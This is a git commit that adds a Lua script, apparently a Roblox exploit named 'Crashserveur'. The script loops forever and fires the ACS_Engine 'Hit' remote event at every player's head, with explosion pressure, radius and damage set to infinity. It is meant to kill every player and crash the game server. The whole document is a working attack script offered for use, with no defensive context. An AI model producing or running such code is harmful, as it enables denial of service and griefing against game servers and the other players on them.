b93edfeea8b0c2d9931a59bae455891b76b08733
lobox920 <86623018+lobox920@users.noreply.github.com>
2021-09-21 18:16:54 +0000

    Update Crashserveur.lua

--- Crashserveur.lua
+++ Crashserveur.lua
@@ -1,1 +1,19 @@
-local
+local plr = game.Players.LocalPlayer
+local Evt = game.ReplicatedStorage.ACS_Engine.Eventos
+
+local Settings = {
+   ["ExplosiveHit"] = true,
+   ["ExPressure"] = math.huge,
+   ["ExpRadius"] = math.huge,
+   ["DestroyJointRadiusPercent"] = math.huge,
+   ["ExplosionDamage"] = math.huge,
+}
+
+
+while wait() do
+   pcall(function()
+      for i,v in pairs(game.Players:GetChildren()) do
+           game.ReplicatedStorage.ACS_Engine.Eventos.Hit:FireServer(v.Character.Head.Position, v.Character.Head, v.Character.Head.Position, Enum.Material.Plastic, Settings)
+       end
+   end)
+end
